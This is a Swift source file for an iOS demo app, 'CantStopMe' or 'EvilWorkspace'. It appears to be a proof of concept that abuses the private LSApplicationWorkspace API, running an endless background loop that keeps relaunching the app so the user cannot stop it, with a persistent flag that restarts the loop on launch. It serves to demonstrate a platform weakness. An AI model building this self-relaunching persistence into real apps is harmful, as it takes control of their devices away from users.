//
//  ContentView.swift
//  CantStopMe
//
//  Created by fridakitten on 03.05.25.
//

import SwiftUI

func pthread_dispatch(_ code: @escaping () -> Void) {
    var thread: pthread_t?
    let blockPointer = UnsafeMutableRawPointer(Unmanaged.passRetained(code as AnyObject).toOpaque())
    
    pthread_create(&thread, nil, { ptr in
        let unmanaged = Unmanaged<AnyObject>.fromOpaque(ptr)
        let block = unmanaged.takeRetainedValue() as! () -> Void
        block()
        return nil
    }, blockPointer)
}

struct ContentView: View {
    
    @State var disabled: Bool = false
    @AppStorage("isEvil") var isEvil: Bool = false
    
    var body: some View {
        VStack {
            Text("EvilWorkspace")
                .font(.system(size: 40))
            Spacer()
            Button(isEvil ? "Dont be Evil" : "Be Evil") {
                if !isEvil {
                    evilRestartLoop()
                } else {
                    isEvil = false
                    disabled = false
                }
            }
            .foregroundColor(isEvil ? .red : .blue)
            Spacer().frame(height: 50)
            Button("Restart App") {
                evilRestart()
            }
            .disabled(disabled)
            Spacer()
            Text("PID: \(getpid())")
            Text("Discovered by.SeanIsTethered")
        }
        .padding()
        .onAppear {
            if isEvil {
                evilRestartLoop()
            }
        }
    }
    
    func evilRestartLoop() {
        isEvil = true
        disabled = true
        
        guard let workspace = LSApplicationWorkspace.default() else { return }
        
        pthread_dispatch {
            while true {
                workspace.openApplication(withBundleID: Bundle.main.bundleIdentifier)
                if !isEvil {
                    return
                }
            }
        }
    }
    
    func evilRestart() {
        disabled = true
        
        guard let workspace = LSApplicationWorkspace.default() else { return }
        
        pthread_dispatch {
            while true {
                workspace.openApplication(withBundleID: Bundle.main.bundleIdentifier)
            }
        }
        
        pthread_dispatch {
            Thread.sleep(forTimeInterval: 0.2)
            exit(0)
        }
    }
}
